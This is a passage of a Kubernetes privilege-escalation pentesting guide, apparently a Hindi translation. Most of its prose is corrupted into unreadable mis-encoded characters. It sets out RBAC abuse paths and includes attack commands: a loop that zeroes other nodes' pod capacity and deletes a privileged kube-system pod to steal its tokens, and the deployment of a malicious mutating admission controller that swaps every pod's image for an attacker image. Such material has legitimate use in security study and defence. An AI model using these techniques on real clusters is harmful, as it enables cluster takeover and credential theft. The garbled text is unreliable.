рдлрд┐рд░, рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ **GCP IAM** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, K8s рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдЙрдирдХреЗ **рд╕рдордХрдХреНрд╖ GCP IAM рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рдкрд╛рд╕ рдпрд╣ рд╣реИ, рддреЛ рд╡рд╣ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛ред

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЕрд╕рд╛рдЗрди рдХрд░рдирд╛** рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдЙрд╕рдХреЗ **рдИрдореЗрд▓** рджреНрд╡рд╛рд░рд╛ рдХрд░рдирд╛ (GCP рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рд╕рд╣рд┐рдд)ред

### рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдмрдирд╛рдирд╛

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬреЛ **TokenRequests** (`serviceaccounts/token`) рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдмрд╛рдд рдХрд░рддреЗ рд╕рдордп SAs (рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдВ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego) рд╕реЗ)ред

### ephemeralcontainers

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬреЛ **`update`** рдпрд╛ **`patch`** **`pods/ephemeralcontainers`** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ **рдЕрдиреНрдп рдкреЙрдбреНрд╕ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдЕрдкрдиреЗ рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░** рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд securityContext рдХреЗ рд╕рд╛рде рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдХрдВрдЯреЗрдирд░ рдЬреЛрдбрд╝рдХрд░ред

### ValidatingWebhookConfigurations рдпрд╛ MutatingWebhookConfigurations

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ `validatingwebhookconfigurations` рдпрд╛ `mutatingwebhookconfigurations` рдкрд░ `create`, `update` рдпрд╛ `patch` рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдХреНрд░рд┐рдпрд╛ рд╣реИ, рд╡реЗ **рдРрд╕реЗ webhookconfigurations рдореЗрдВ рд╕реЗ рдПрдХ рдмрдирд╛рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХреЗрдВ**ред

рдПрдХ [`mutatingwebhookconfigurations` рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЗрд╕ рдЕрдиреБрднрд╛рдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ](./#malicious-admission-controller).

### рд╡реГрджреНрдзрд┐ рдХрд░рдирд╛

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдЕрдЧрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ: [**рдирд┐рд░реНрдорд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд░реЛрдХрдерд╛рдо**](./#built-in-privileged-escalation-prevention), рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдирдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдмрд┐рдирд╛ рди рддреЛ рднреВрдорд┐рдХрд╛рдПрдБ рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдПрдБ рдЕрдкрдбреЗрдЯ рдпрд╛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рд╕рд┐рд╡рд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ **`roles`** рдпрд╛ **`clusterroles`** рдкрд░ **рдХреНрд░рд┐рдпрд╛ `escalate`** рд╣реЛред\
рддрдм рд╡рд╣ рдирдИ рднреВрдорд┐рдХрд╛рдПрдБ, рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдПрдБ рдмреЗрд╣рддрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ/рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╣реИрдВред

### рдиреЛрдбреНрд╕ рдкреНрд░реЙрдХреНрд╕реА

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ **`nodes/proxy`** рдЙрдкрд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рд╡реЗ Kubelet API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреЙрдбреНрд╕ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣рд╛рдВ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego))ред Kubelet рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдкреГрд╖реНрда рдкрд░:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

рдЖрдкрдХреЗ рдкрд╛рд╕ [**Kubelet API рд╕реЗ рдЕрдзрд┐рдХреГрдд рдмрд╛рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рд╣реИ**](../pentesting-kubernetes-services/#kubelet-rce)ред

### рдкреЙрдбреНрд╕ рд╣рдЯрд╛рдирд╛ + рдЕрд╕реНрдерд╛рдпреА рдиреЛрдбреНрд╕

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬреЛ **рдкреЙрдбреНрд╕ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`pods` рд╕рдВрд╕рд╛рдзрди рдкрд░ `delete` рдХреНрд░рд┐рдпрд╛), рдпрд╛ **рдкреЙрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдХрд╛рд╕рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (`pods/eviction` рд╕рдВрд╕рд╛рдзрди рдкрд░ `create` рдХреНрд░рд┐рдпрд╛), рдпрд╛ **рдкреЙрдб рд╕реНрдерд┐рддрд┐ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ** (рдкреЙрдбреНрд╕/рд╕реНрдерд┐рддрд┐ рддрдХ рдкрд╣реБрдВрдЪ) рдФрд░ **рдЕрдиреНрдп рдиреЛрдбреНрд╕ рдХреЛ рдЕрд╕реНрдерд╛рдпреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдиреЛрдбреНрд╕/рд╕реНрдерд┐рддрд┐ рддрдХ рдкрд╣реБрдВрдЪ) рдпрд╛ **рдиреЛрдбреНрд╕ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`nodes` рд╕рдВрд╕рд╛рдзрди рдкрд░ `delete` рдХреНрд░рд┐рдпрд╛) рдФрд░ рдПрдХ рдкреЙрдб рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд░рдЦрддреЗ рд╣реИрдВ, рд╡реЗ **рдЕрдиреНрдп рдиреЛрдбреНрд╕ рд╕реЗ рдкреЙрдбреНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рд╡реЗ **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП** **рдиреЛрдб** рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдВ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдЙрди рдкреЙрдбреНрд╕ рд╕реЗ **рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХреЗ**ред 

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реНрдерд┐рддрд┐ (CVE-2020-8554)

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬреЛ **`services/status`** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ `status.loadBalancer.ingress.ip` рдлрд╝реАрд▓реНрдб рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЕрдирдлрд┐рдХреНрд╕реНрдб CVE-2020-8554** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл MiTM рд╣рдорд▓реЗ** рд╢реБрд░реВ рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВред CVE-2020-8554 рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рдВрд╢ рдирд┐рд╡рд╛рд░рдг рдХреЗрд╡рд▓ ExternalIP рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ (рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego))ред

### рдиреЛрдбреНрд╕ рдФрд░ рдкреЙрдбреНрд╕ рдХреА рд╕реНрдерд┐рддрд┐

рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ `nodes/status` рдпрд╛ `pods/status` рдкрд░ **`update`** рдпрд╛ **`patch`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рд╡реЗ рд▓реЗрдмрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд▓рд╛рдЧреВ рдХрд┐рдП рдЧрдП рд╢реЗрдбреНрдпреВрд▓рд┐рдВрдЧ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

## рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд░реЛрдХрдерд╛рдо

Kubernetes рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ [рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рддрдВрддреНрд░](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) рд╣реИред

рдпрд╣ рдкреНрд░рдгрд╛рд▓реА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреВрдорд┐рдХрд╛рдУрдВ рдпрд╛ рднреВрдорд┐рдХрд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рдирд╣реАрдВ рд╕рдХрддреЗ**ред рдЗрд╕ рдирд┐рдпрдо рдХрд╛ рдкреНрд░рд╡рд░реНрддрди API рд╕реНрддрд░ рдкрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ RBAC рдкреНрд░рд╛рдзрд┐рдХрд░реНрддрд╛ рдХреЗ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛрдиреЗ рдкрд░ рднреА рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдирд┐рдпрдо stipulates рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рддрднреА рдПрдХ рднреВрдорд┐рдХрд╛ рдмрдирд╛ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЙрд╕рдХреЗ рдкрд╛рд╕ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╕рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдореМрдЬреВрджрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджрд╛рдпрд░рд╛ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЗ рджрд╛рдпрд░реЗ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╡реЗ рдмрдирд╛рдиреЗ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ: рдпрд╛ рддреЛ ClusterRoles рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА рдпрд╛ Roles рдХреЗ рд▓рд┐рдП рдЙрд╕реА namespace (рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА) рдореЗрдВред

{% hint style="warning" %}
рдкрд┐рдЫрд▓реЗ рдирд┐рдпрдо рдХрд╛ рдПрдХ рдЕрдкрд╡рд╛рдж рд╣реИред рдпрджрд┐ рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рдкрд╛рд╕ **`roles`** рдпрд╛ **`clusterroles`** рдкрд░ **рдХреНрд░рд┐рдпрд╛ `escalate`** рд╣реИ, рддреЛ рд╡рд╣ рдмрд┐рдирд╛ рд╕реНрд╡рдпрдВ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рднреА рднреВрдорд┐рдХрд╛рдУрдВ рдФрд░ рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### **RoleBindings/ClusterRoleBindings рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдкреИрдЪ рдХрд░реЗрдВ**

{% hint style="danger" %}
**рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рддрдХрдиреАрдХ рдкрд╣рд▓реЗ рдХрд╛рдо рдХрд░рддреА рдереА, рд▓реЗрдХрд┐рди рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдЖрдк рдЕрдкрдиреЗ рд▓рд┐рдП рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп SA рдХреЛ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рднреВрдорд┐рдХрд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдирд╣реАрдВ рдмрдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗред**
{% endhint %}

Rolebindings рдмрдирд╛рдиреЗ рдХрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

## рдЕрдиреНрдп рд╣рдорд▓реЗ

### рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреЙрдбреНрд╕ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдХреЛрдИ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдирд╣реАрдВ рд╣реИред рдЖрдкрд╕реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рджреЛ-рддрд░рдлрд╛, рдкреЙрдб рд╕реЗ рдкреЙрдбред

#### рдПрдХ рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк рдмрдирд╛рдПрдВ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

рдЕрдкрдирд╛ .yaml рдмрдирд╛рдПрдВ
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
рдЕрдкрдиреА .yaml рдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЕрдирдХрдореЗрдВрдЯ рдХреА рдЧрдИ рдкрдВрдХреНрддрд┐рдпрд╛рдБ рдЬреЛрдбрд╝реЗрдВ:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд▓реЙрдЧ рджреЗрдЦреЗрдВ:
```bash
kubectl logs app -C proxy
```
More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреНрд░рд╡реЗрд╢ рдирд┐рдпрдВрддреНрд░рдХ

рдПрдХ рдкреНрд░рд╡реЗрд╢ рдирд┐рдпрдВрддреНрд░рдХ **Kubernetes API рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ** рд╡рд╕реНрддреБ рдХреЗ рд╕реНрдерд╛рдпреАрдХрд░рдг рд╕реЗ рдкрд╣рд▓реЗ, рд▓реЗрдХрд┐рди **рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд** **рдФрд░ рдЕрдзрд┐рдХреГрдд** рдХрд░рдиреЗ рдХреЗ рдмрд╛рджред

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рддрд░рд╣ **Mutationg Admission Controller рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **рдкрд╣рд▓реЗ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛, рдФрд░ рдЕрдзрд┐рдХрддрд░ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╕реНрдерд╛рдпреА рд░рд╣рдирд╛ред

**рдЙрджрд╛рд╣рд░рдг** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
рд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рддреИрдпрд╛рд░ рд╣реИ:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреЙрдб рддреИрдирд╛рдд рдХрд░реЗрдВ:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
рдЬрдм рдЖрдк `ErrImagePull` рддреНрд░реБрдЯрд┐ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЫрд╡рд┐ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐рд╕реА рдПрдХ рдкреНрд░рд╢реНрди рдХреЗ рд╕рд╛рде:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рдХреА рдЫрд╡рд┐ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдордиреЗ `nginx` рдЗрдореЗрдЬ рдЪрд▓рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рд▓реЗрдХрд┐рди рдЕрдВрддрд┐рдо рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдЗрдореЗрдЬ `rewanthtammana/malicious-image` рд╣реИред рдХреНрдпрд╛ рд╣реБрдЖ!!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ рдореНрдпреВрдЯреЗрдЯрд┐рдВрдЧ рд╡реЗрдмрд╣реБрдХ рдПрдбрдорд┐рд╢рди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреА рд╣реИ, рдЬреЛ рдЗрд╕рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд▓рд╛рдЗрдиреЛрдВ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ Kubernetes API рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреА рд╣реИ, рдЬреЛ рджреЗрдЦреЗ рдЧрдП рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Service Account Tokens рдХреЗ Automount рдХреЛ рдмрдВрдж рдХрд░рдирд╛**

* **Pods рдФрд░ Service Accounts**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, pods рдПрдХ service account token рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддреЗ рд╣реИрдВред рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, Kubernetes рдЗрд╕ automount рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рдмрдВрдж рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
